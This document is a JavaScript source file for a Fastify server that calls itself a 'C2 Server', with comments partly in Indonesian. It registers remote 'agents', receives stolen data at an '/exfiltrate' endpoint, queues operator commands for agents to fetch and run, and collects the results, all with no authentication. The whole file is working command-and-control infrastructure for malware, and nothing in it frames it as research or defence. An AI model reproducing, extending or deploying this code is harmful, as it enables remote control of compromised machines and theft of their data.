const fastify = require("fastify")({ logger: true });
const Database = require('better-sqlite3');
const path = require('path');
const fs = require('fs');

const dbPath = path.join(__dirname, 'prisma', 'dev.db');
if (!fs.existsSync(path.join(__dirname, 'prisma'))) {
  fs.mkdirSync(path.join(__dirname, 'prisma'));
}

const db = new Database(dbPath);

// Initialize DB
db.exec(`
  CREATE TABLE IF NOT EXISTS Agent (
    id TEXT PRIMARY KEY,
    hostname TEXT UNIQUE,
    ip_address TEXT,
    last_seen DATETIME DEFAULT CURRENT_TIMESTAMP
  );

  CREATE TABLE IF NOT EXISTS Log (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    type TEXT,
    content TEXT,
    createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
    agentHostname TEXT,
    FOREIGN KEY(agentHostname) REFERENCES Agent(hostname)
  );

  CREATE TABLE IF NOT EXISTS Command (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    command TEXT,
    result TEXT,
    status TEXT DEFAULT 'pending',
    agentId TEXT,
    createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY(agentId) REFERENCES Agent(id)
  );
`);

// Register CORS
fastify.register(require("@fastify/cors"), {
  origin: "*",
  methods: ["GET", "POST", "PUT", "DELETE"],
});

// Registrasi Agent
fastify.post("/register", async (request, reply) => {
  const { hostname, ip_address } = request.body;
  const id = crypto.randomUUID ? crypto.randomUUID() : require('crypto').randomUUID();
  
  const existing = db.prepare('SELECT id FROM Agent WHERE hostname = ?').get(hostname);
  
  if (existing) {
    db.prepare('UPDATE Agent SET last_seen = CURRENT_TIMESTAMP, ip_address = ? WHERE hostname = ?')
      .run(ip_address, hostname);
    return { id: existing.id, hostname, ip_address };
  } else {
    db.prepare('INSERT INTO Agent (id, hostname, ip_address) VALUES (?, ?, ?)')
      .run(id, hostname, ip_address);
    return { id, hostname, ip_address };
  }
});

// Terima Data Exfiltration
fastify.post("/exfiltrate", async (request, reply) => {
  const { hostname, type, content } = request.body;
  db.prepare('INSERT INTO Log (type, content, agentHostname) VALUES (?, ?, ?)')
    .run(type, content, hostname);
  return { success: true };
});

// API untuk Dashboard (Ambil semua data)
fastify.get("/agents", async () => {
  const agents = db.prepare('SELECT * FROM Agent ORDER BY last_seen DESC').all();
  return agents.map(a => {
    const logs = db.prepare('SELECT * FROM Log WHERE agentHostname = ? ORDER BY createdAt DESC LIMIT 5').all(a.hostname);
    const logCount = db.prepare('SELECT COUNT(*) as count FROM Log WHERE agentHostname = ?').get(a.hostname).count;
    return { ...a, logs, _count: { logs: logCount } };
  });
});

// Get Logs for specific agent
fastify.get("/logs/:hostname", async (request) => {
  const { hostname } = request.params;
  return db.prepare('SELECT * FROM Log WHERE agentHostname = ? ORDER BY createdAt DESC LIMIT 50').all(hostname);
});

// Dashboard mengirim perintah ke Agent tertentu
fastify.post("/command/send", async (request) => {
  const { agentId, command } = request.body;
  const info = db.prepare('INSERT INTO Command (agentId, command, status) VALUES (?, ?, ?)')
    .run(agentId, command, 'pending');
  return { id: info.lastInsertRowid, success: true };
});

// Agent mengecek apakah ada perintah baru
fastify.get("/command/next/:agentHostname", async (request) => {
  const { agentHostname } = request.params;
  const agent = db.prepare('SELECT id FROM Agent WHERE hostname = ?').get(agentHostname);
  if (!agent) return null;

  return db.prepare('SELECT * FROM Command WHERE agentId = ? AND status = "pending" ORDER BY createdAt ASC').get(agent.id);
});

// Agent mengirim balik hasil eksekusi
fastify.post("/command/result", async (request) => {
  const { commandId, result } = request.body;
  db.prepare('UPDATE Command SET result = ?, status = "executed" WHERE id = ?')
    .run(result, commandId);
  return { success: true };
});

fastify.listen({ port: 8000, host: '0.0.0.0' }, (err) => {
  if (err) {
    fastify.log.error(err);
    process.exit(1);
  }
  console.log("C2 Server running on port 8000");
});
